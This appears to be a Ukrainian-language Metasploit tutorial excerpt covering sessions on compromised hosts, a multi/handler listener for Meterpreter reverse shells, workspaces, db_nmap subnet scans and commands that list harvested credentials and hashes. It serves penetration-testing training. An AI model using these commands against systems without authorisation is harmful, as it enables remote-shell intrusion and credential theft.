# Виконання

Робота з сесіями

Сесія — активне підключення до скомпрометованої системи. MSF підтримує паралельну роботу з багатьма сесіями.
sessions -l # список активних сесій
sessions -i 1 # підключитись до сесії 1
sessions -u 1 # оновити shell до meterpreter
sessions -K # закрити всі сесії
background # відправити сесію у фон (Ctrl+Z)

multi/handler — ловіння reverse shells

# Налаштування listener для прийому зворотних підключень
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 10.0.0.1
set LPORT 4444
exploit -j # запустити у фоні

# Після отримання підключення:
sessions -l
sessions -i 1

multi/handler використовується для прийому зворотних підключень від payload, згенерованих msfvenom або інших джерел.

База даних та workspace

# Перевірка стану БД
db_status

# Управління workspace (для ізоляції проєктів)
workspace # список workspace
workspace -a pentest_2026 # створити новий
workspace pentest_2026 # переключитись
workspace -d old_project # видалити

# Сканування із збереженням у БД
db_nmap -sV -sC 10.0.0.0/24
db_nmap -p- --open 192.168.1.0/24

# Перегляд зібраних даних
hosts # виявлені хости
hosts -c address,os_name # конкретні колонки
services # виявлені сервіси
services -p 445 # фільтр за портом
vulns # виявлені вразливості
creds # отримані паролі та хеші

# Експорт даних
db_export -f xml /tmp/results.xml
Поради:
• Використовуйте окремі workspace для різних проєктів
• db_nmap автоматично парсить результати та зберігає в БД
• Команда hosts -R встановлює RHOSTS для всіх виявлених хостів
• Регулярно експортуйте дані для звітності
